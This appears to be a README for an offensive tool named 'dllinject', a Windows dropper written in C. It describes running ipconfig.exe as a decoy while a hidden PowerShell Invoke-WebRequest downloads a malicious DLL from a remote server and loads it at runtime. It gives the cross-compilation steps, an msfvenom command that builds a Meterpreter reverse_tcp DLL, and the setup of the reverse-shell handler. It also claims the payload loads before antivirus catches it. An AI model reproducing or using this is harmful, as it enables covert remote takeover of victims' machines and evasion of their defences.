This C code is cross-compiled using i686-w64-mingw32-gcc , on a Linux <hostname> 4.18.0-kali2-amd64 #1 SMP Debian 4.18.10-2kali1 (2018-10-09) x86_64 GNU/Linux System.

Thus you would require i686-w64-mingw32-gcc compiler to compile Windows PE32 executables on Linux.

loadDLL() functionality :

The code basically invokes a powershell command (Invoke-WebRequest) to download a malicious DLL hosted in a remote webserver, while invoking an "ipconfig.exe" command.
Thus to the victim, the download of the malicious dll is virtually invisible.

The code loads the malicious dll in the runtime and pushes it in the stack, for execution.

main() function:

1. Invokes the ipconfig.exe 
2. Calls the loadDLL(); function.

Dependencies : 
1. sudo apt-get update
2. apt-get install mingw-w64

Compilation:

i686-w64-mingw32-gcc dllinject.c -o ipconfigg.exe

DLL generation :
msfvenom -p windows/meterpreter/reverse_tcp lhost=<your ip> lport=<desired port> -f dll -o test.dll

I have purposely not used any encoders as the process is fast enought to load the dll on runtime, before the AV software daemon runcheck detects it.

Similarly , you need to start a meterpreter reverse handler with specified parameters , to obtain the reverse shell.
# dllinject
